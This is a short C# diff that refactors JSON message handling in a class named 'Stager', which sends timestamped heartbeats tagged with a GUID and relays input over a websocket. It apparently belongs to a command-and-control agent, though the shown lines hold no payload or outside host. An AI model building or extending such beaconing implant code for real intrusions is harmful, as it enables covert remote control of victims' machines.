@@ -47,23 +47,9 @@ class Stager
             {
                 Int32 unixTimestamp = (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
 
-                /*
-                using var ms = new MemoryStream();
-                using var writer = new Utf8JsonWriter(ms);
-                writer.WriteStartObject();
-                writer.WriteString("guid", GUID);
-                writer.WriteString("heartbeat", unixTimestamp.ToString());
-                writer.WriteEndObject();
-                writer.Flush();
+                string msg = JsonMessage(unixTimestamp.ToString());
                 
-
-                string json = Encoding.UTF8.GetString(ms.ToArray());
-
-                string msg = json.ToString();
-                */
-
-                
-                await Send(ws, JsonMessage(unixTimestamp.ToString()));
+                await Send(ws, msg);
 
                 // Sending (Legacy)
                 //ArraySegment<byte> bytesToSend = new ArraySegment<byte>(Encoding.UTF8.GetBytes(json));
@@ -111,21 +97,9 @@ class Stager
                     break;
                 }
 
-                /*
-                using var ms = new MemoryStream();
-                using var writer = new Utf8JsonWriter(ms);
-                writer.WriteStartObject();
-                writer.WriteString("guid", GUID);
-                writer.WriteString("message", input);
-                writer.WriteEndObject();
-                writer.Flush();
-
-                string json = Encoding.UTF8.GetString(ms.ToArray());
-
-                string msg = json.ToString();
-                */
-
-                await Send(ws, JsonMessage(input));
+                string msg = JsonMessage(input);
+                
+                await Send(ws, msg);
                 await Receive(ws);
 
                 // Sending (Legacy)
